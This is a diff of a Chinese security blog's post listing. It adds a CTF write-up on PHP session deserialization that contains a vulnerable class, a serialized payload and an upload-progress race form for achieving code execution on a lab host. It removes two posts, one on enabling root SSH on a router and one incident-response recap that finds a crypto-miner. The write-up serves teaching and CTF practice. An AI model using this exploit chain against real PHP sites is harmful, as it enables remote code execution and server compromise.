+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一个例子引入"><a href="#一个例子引入" class="headerlink" title="一个例子引入"></a>一个例子引入</h1><ul>
+<li><p><strong><em>session.php</em></strong></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
+session_start();
+$_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
+?&gt;</code></pre>
+</li>
+<li><p><strong><em>payload.php</em></strong></p>
+<pre><code class="php">&lt;?php
+class XianZhi{
+    public $name;
+    function __wakeup(){
+      echo &quot;Who are you?&quot;;
+    }
+    function __destruct(){
+      echo &#39;&lt;br&gt;&#39;.$this-&gt;name;
+    }
+}
+    $str = new XianZhi();
+    $str-&gt;name = &quot;xianzhi&quot;;
+    echo serialize($str);
+  ?&gt;</code></pre>
+</li>
+<li><p><strong><em>class.php</em></strong></p>
+<pre><code class="php">&lt;?php
+    error_reporting(0);
+  ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
+  session_start();
+    class XianZhi{
+    public $name = &#39;panda&#39;;
+    function __wakeup(){
+      echo &quot;Who are you?&quot;;
+    }
+    function __destruct(){
+      echo &#39;&lt;br&gt;&#39;.$this-&gt;name;
+    }
+  }
+  $str = new XianZhi();
+ ?&gt;</code></pre>
+</li>
+<li><p>payload.php中获取序列化的payload,然后再访问<code>session.php</code>文件传入<code>|</code>+<code>序列化</code>格式的值，然后再次访问<code>class.php</code>文件的时候 会发现页面会多了个”xianzhi”这说明我们传入的值被反序列化了。</p>
+</li>
+</ul>
+<h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><ul>
+<li><p>我们看巅峰极客这道题,可以很明显这里使用了一个<code>file_put_contents</code>将内容写到了一个指定地址的地方，那么我们该如何利用呢，那么这里就可以使用session反序列化将我们传入的序列化内容，从而控制Cache类，将类属性改成我们想要的内容，从而达到RCE的效果。问题又来了那么怎么才能控制SESSION呢，这里可以用到 <code>PHP BUG #71101</code> ，也就是常用的SESSION文件包含（上传进度文件）RCE的漏洞，将SESSION传入并导致反序列化。</p>
+<pre><code class="php">&lt;?php
+class Cache{
+    public $data;
+    public $sj;
+    public $path;
+    public $html;
+    function __construct($data){
+        $this-&gt;data[&#39;name&#39;]=isset($data[&#39;post&#39;][&#39;name&#39;])?$data[&#39;post&#39;][&#39;name&#39;]:&#39;&#39;;
+        $this-&gt;data[&#39;message&#39;]=isset($data[&#39;post&#39;][&#39;message&#39;])?$data[&#39;post&#39;][&#39;message&#39;]:&#39;&#39;;
+        $this-&gt;data[&#39;image&#39;]=!empty($data[&#39;image&#39;])?$data[&#39;image&#39;]:&#39;/static/images/pic04.jpg&#39;;
+        $this-&gt;path=Cache_DIR.DS.session_id().&#39;.php&#39;;
+    }
+
+    function __destruct(){
+        $this-&gt;html=sprintf(&#39;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/main.css&quot; /&gt;&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/noscript.css&quot; /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class=&quot;is-preload&quot;&gt;&lt;div id=&quot;wrapper&quot;&gt;&lt;header id=&quot;header&quot;&gt; &lt;div class=&quot;logo&quot;&gt;&lt;span class=&quot;icon fa-diamond&quot;&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class=&quot;content&quot;&gt;&lt;div class=&quot;inner&quot;&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href=&quot;#you&quot;&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id=&quot;main&quot;&gt;&lt;article id=&quot;you&quot;&gt;    &lt;h2 class=&quot;major&quot; ng-app&gt;%s&lt;/h2&gt;    &lt;span class=&quot;image main&quot;&gt;&lt;img src=&quot;%s&quot; alt=&quot;&quot; /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type=&quot;button&quot; onclick=location.href=&quot;/download/%s&quot;&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id=&quot;footer&quot;&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/browser.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/breakpoints.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/util.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/main.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/angular.js&quot;&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;&#39;,substr($this-&gt;data[&#39;name&#39;],0,62),$this-&gt;data[&#39;image&#39;],$this-&gt;data[&#39;message&#39;],session_id().&#39;.jpg&#39;);
+
+        if(file_put_contents($this-&gt;path,$this-&gt;html)){
+            include($this-&gt;path);
+        }
+    }
+}</code></pre>
+</li>
+<li><p>payload</p>
+<pre><code class="php">&lt;?php
+
+class Cache{
+    public $data ;
+    public $sj;
+    public $path = &#39;/Library/WebServer/Documents/ctf/index.php&#39;;
+    public $html;
+
+}
+    $str = new Cache();
+    $str-&gt;data= [
+    &quot;name&quot; =&gt; &quot;payload&quot;,
+    &quot;message&quot; =&gt; &quot;panda&quot;,
+    &quot;image&quot; =&gt; &quot;panda&quot;
+];
+    echo serialize($str);
+
+?&gt;</code></pre>
+</li>
+</ul>
+<ul>
+<li><p>EXP</p>
+<p>最后使用SESSION上传进度，将其包含进SESSION,这里使用条件竞争。</p>
+<pre><code class="php">&lt;form action=&quot;http://10.37.14.49/ctf/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;这里填payload&quot; /&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;</code></pre>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7d58228d.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2584,338 +3380,6 @@ inject.tables_count()</code></pre>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d386e3624.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d386e3624.html" class="post-title-link" itemprop="url">极路由开启SSH并按照python笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-09-27 13:26:23" itemprop="dateCreated datePublished" datetime="2019-09-27T13:26:23+08:00">2019-09-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:19:48" itemprop="dateModified" datetime="2020-10-14T17:19:48+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/IoT安全/" itemprop="url" rel="index"><span itemprop="name">IoT安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>极路由在现在的版本中并不支持telnet连接，在网上还是找到getshell这个路由器的方法。再此复现，并作笔记。</p>
-<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ul>
-<li><p>路由器需SDcare</p>
-</li>
-<li><p>安装 <code>定时重拨</code>插件（sid=118284854）</p>
-</li>
-<li><p>安装<code>vsftpd</code>插件（sid=770934750）</p>
-</li>
-</ul>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h4 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h4><ul>
-<li>将以下脚本保存为<code>test.sh</code>,放置在<code>ftp://hiwifi.com/</code>目录下,该目录是SD卡并被挂载在<code>/tmp/storage</code>下,<code>vsftpd</code>插件定义目录也在<code>/tmp/storage</code>即可</li>
-</ul>
-<pre><code class="shell">#!/bin/bash
-
-# 启动SSH并设置自动启动
-sed -i &#39;s/1022/22/g&#39; /etc/config/dropbear 
-/etc/init.d/dropbear enable
-/etc/init.d/dropbear start</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/1569562530306.png" alt="img"></p>
-<ul>
-<li>设置定时重拨规则：<code>* * * * * sh /tmp/storage/test.sh</code></li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/15695626475301.png" alt="img"></p>
-<ul>
-<li>启动等待一分钟即可直接ssh连接上路由器账号为<code>root</code>,密码为后台密码。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/15695627717019.png" alt="img"></p>
-<h4 id="安装python和pip"><a href="#安装python和pip" class="headerlink" title="安装python和pip"></a>安装python和pip</h4><ul>
-<li>设置<code>opkg</code>源,<code>/etc/opkg.conf</code>设置为如下内容，其中第五行，dest usb +SD卡的地址，也就是<code>/tmp/storage/soft</code></li>
-</ul>
-<pre><code class="shell">dest root /
-dest ram /tmp
-lists_dir ext /var/opkg-lists
-option overlay_root /overlay
-
-dest usb /tmp/storage/soft 
-
-arch all 100
-arch ramips_24kec 200
-arch ramips 300
-arch mips 400
-arch unkown 500
-
-
-src/gz barrier_breaker_base http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/base
-src/gz barrier_breaker_luci http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/luci
-src/gz barrier_breaker_management http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/management
-src/gz barrier_breaker_oldpackages http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/oldpackages
-src/gz barrier_breaker_packages http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/packages
-src/gz barrier_breaker_routing http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/routing
-src/gz barrier_breaker_telephony http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/telephony</code></pre>
-<ul>
-<li>安装过程</li>
-</ul>
-<pre><code class="shell">opkg update
-
-wget http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/base/libc_0.9.33.2-1_ramips_24kec.ipk
-
-opkg -d usb install libc_0.9.33.2-1_ramips_24kec.ipk
-
-opkg -d usb install libreadline
-opkg  -d usb install python
-opkg -d usb install python-json
-opkg -d usb install python-curl
-opkg -d usb install python-openssl
-</code></pre>
-<ul>
-<li>设置环境变量，也是加上python安装目录</li>
-</ul>
-<pre><code>export PATH=$PATH:/tmp/storage/soft/usr/bin </code></pre><ul>
-<li>安装pip</li>
-</ul>
-<pre><code class="shell">wget --no-check-certificate https://bootstrap.pypa.io/get-pip.py  
-
-python get-pip.py</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d522b80276.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d522b80276.html" class="post-title-link" itemprop="url">强网杯应急响复盘</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-09-23 22:43:54" itemprop="dateCreated datePublished" datetime="2019-09-23T22:43:54+08:00">2019-09-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:20:14" itemprop="dateModified" datetime="2020-10-14T17:20:14+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="事中应急响应"><a href="#事中应急响应" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><p>对应急响应经验不足错误总结如下：</p>
-<p><strong>失误</strong>：</p>
-<ul>
-<li><p>操作频繁，导致shell命令覆盖，无法朔源黑客执行的哪些操作</p>
-</li>
-<li><p>web访问频繁，导致web日志存在大量自身ip地址导致审计困难。</p>
-</li>
-</ul>
-<p><strong>正确操作：</strong></p>
-<ul>
-<li><p>历史命令增加储存为1万条</p>
-<pre><code class="shell">sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></pre>
-</li>
-<li><p>给历史命令增加登录的IP地址、执行命令时间等信息</p>
-<p>在/etc/profile的文件尾部添加如下行数配置信息：</p>
-</li>
-</ul>
-<pre><code class="shell">######jiagu history xianshi#########
-USER_IP=`who -u am i 2&gt;/dev/null | awk &#39;{print $NF}&#39; | sed -e &#39;s/[()]//g&#39;`
-if [ &quot;$USER_IP&quot; = &quot;&quot; ]
-then
-USER_IP=`hostname`
-fi
-export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;
-shopt -s histappend
-export PROMPT_COMMAND=&quot;history -a&quot;
-######### jiagu history xianshi ##########</code></pre>
-<p>​    让配置生效</p>
-<pre><code class="sehll">source /etc/profile
-
-生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</code></pre>
-<ul>
-<li>开启<code>tcpdump</code>抓取流量到文件，以便使用<code>wireshark</code>分析</li>
-</ul>
-<h2 id="事中应急响应-1"><a href="#事中应急响应-1" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><h3 id="web日志审计"><a href="#web日志审计" class="headerlink" title="web日志审计"></a>web日志审计</h3><ul>
-<li>从日志可以发现，黑客对网站的后台发起了大量登陆尝试</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692531384896.png" alt="img"></p>
-<h3 id="系统日志审计"><a href="#系统日志审计" class="headerlink" title="系统日志审计"></a>系统日志审计</h3><ul>
-<li><p>系统登陆日志储存在<code>var/log/auth.log</code>或者<code>var/log/secure</code>上。</p>
-</li>
-<li><p>查看日志成功登陆的IP、用户和时间</p>
-</li>
-</ul>
-<pre><code class="shell">grep &quot;Accepted &quot; auth.log | awk &#39;{print $1,$2,$3,$9,$11}&#39;</code></pre>
-<ul>
-<li>可以看到奇怪的用户名和奇怪的ip。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692542548454.png" alt="img"></p>
-<ul>
-<li>查看具有root权限的用户</li>
-</ul>
-<pre><code class="shell">awk -F: &#39;$3==0{print $1}&#39; /etc/passwd
-或者
-cat /etc/passwd
-查看uid=0的用户
-</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693222606429.png" alt="img"></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692545388895.png" alt="img"></p>
-<ul>
-<li>可以得知存在特权的用户除了root还有mysq1，再查看auth.log日志可以直接看到，该用户是被黑客新添加的，而其登陆ip和第一次登陆时间也可以得知</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692546752738.png" alt="img"></p>
-<h3 id="系统进程审查"><a href="#系统进程审查" class="headerlink" title="系统进程审查"></a>系统进程审查</h3><ul>
-<li>查看所有进程信息，找到异常的程序名</li>
-</ul>
-<pre><code class="shell">ps aux</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693224572614.png" alt="img"></p>
-<ul>
-<li><p>或者使用findshell直接GUI查看进程信息<br><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693225252668.png" alt="img"></p>
-</li>
-<li><p>找到了一个非常奇怪的进程名</p>
-</li>
-</ul>
-<pre><code class="shell">xmr-stak-cpu</code></pre>
-<ul>
-<li>直接查看定时任务也可以看到该进程被启用的信息</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693239569853.png" alt="img"></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/1569323988668.png" alt="img"></p>
-<ul>
-<li>可以知挖矿病毒绝对路径<code>/etc/xmr-stak-cpu/bin/xmr-stak-cpu</code>,同时<code>bin/config.txt</code>存储了挖矿病毒的配置信息，可以直接得知挖矿病毒的钱包地址。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2987,7 +3451,7 @@ cat /etc/passwd
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-count">73</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -3058,12 +3522,12 @@ cat /etc/passwd
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">263k</span>
+    <span title="站点总字数">267k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:59</span>
+    <span title="站点阅读时长">4:02</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
